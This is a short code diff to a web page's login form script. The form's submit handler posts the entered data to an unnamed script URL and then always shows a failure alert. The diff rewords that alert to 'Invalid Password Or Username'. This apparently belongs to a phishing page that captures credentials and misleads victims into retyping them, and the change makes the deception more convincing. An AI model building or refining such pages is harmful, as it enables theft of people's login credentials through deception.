@@ -78,7 +78,7 @@ body {
 		form.addEventListener('submit', e => {
 			e.preventDefault()
 			fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-				.then(response => alert("Could Not Login At The Moment"))
+				.then(response => alert("Invalid Password Or Username"))
 				.catch(error => console.error('Error!', error.message))
 		})
 	</script>
